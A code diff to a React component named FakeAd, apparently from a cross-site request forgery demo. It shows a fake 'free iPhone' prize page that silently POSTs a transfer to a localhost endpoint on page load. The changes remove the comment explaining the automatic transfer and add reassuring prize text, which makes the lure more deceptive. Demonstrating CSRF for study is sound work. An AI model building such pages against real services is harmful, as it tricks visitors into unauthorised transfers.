@@ -1,9 +1,9 @@
 import React, { useEffect } from "react";
 import axios from "axios";
+import "./App.css";
 
 function FakeAd() {
   useEffect(() => {
-    // Automatically trigger the transfer when the page loads
     axios
       .post(
         "http://localhost:5000/transfer",
@@ -19,17 +19,23 @@ function FakeAd() {
       )
       .catch((error) => {
         console.error("Transfer failed:", error);
-        alert("Oops! Something went wrong.");
       });
   }, []);
 
   return (
-    <div className="container fake-page">
-      <div className="heading-container">
-        <h1>🎉 Congratulations! 🎉</h1>
-        <p className="subtitle">
-          You've won a free iPhone! Check your email for details.
-        </p>
+    <div className="container">
+      <div className="content-box">
+        <div className="heading-container">
+          <h1>🎉 Congratulations! 🎉</h1>
+          <p className="subtitle">
+            You've won a free iPhone! Check your email for details.
+          </p>
+        </div>
+        <div className="info-box">
+          <p className="info-text">
+            We're processing your prize! You'll receive an email shortly with shipping details.
+          </p>
+        </div>
       </div>
     </div>
   );
